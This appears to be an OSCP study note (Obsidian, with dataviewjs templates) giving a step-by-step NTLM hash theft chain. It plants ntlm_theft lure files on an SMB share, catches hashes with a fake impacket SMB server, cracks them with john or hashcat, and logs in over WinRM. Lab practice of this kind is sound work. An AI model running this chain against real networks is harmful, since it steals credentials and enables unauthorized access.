
Create vault.lnk
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `cd ~/Desktop/Tools/Windows/ntlm_theft && python3 ntlm_theft.py -g all -s ${KaliIP} -f vault`;

dv.paragraph("```bash\n" + command + "\n```");
```
To fake our SMB server,  **impacket-smbserver**:

```
sudo impacket-smbserver test . -smb2support -debug
```

Check if server is running

```
sudo ss -tulpn | grep 445
```
tcp   LISTEN 0      5                 0.0.0.0:445        0.0.0.0:*    users:(("python3",pid=11501,fd=3))

Put your vault.lnk into the share (Alter the sharename)
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `cd ~/Desktop/Tools/Windows/ntlm_theft/vault && smbclient //${ip}/[sharename]`;

dv.paragraph("```bash\n" + command + "\n```");
```
```
prompt OFF
```

```
mput *
```

Go back on SMB server output to copy the hash

```
echo "[hash]" > hash.txt
```

```
john -w=/usr/share/wordlists/rockyou.txt hash.txt
```

or

```
hashcat -a 0 -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```


Testing Creds (NetExec)
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `nxc winrm ${ip} -u [USER] -p [PASS]`;

dv.paragraph("```bash\n" + command + "\n```");
```

Login using creds (WinRM)
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `evil-winrm -i ${ip} -u [username] -p '[password]'`;

dv.paragraph("```bash\n" + command + "\n```");
```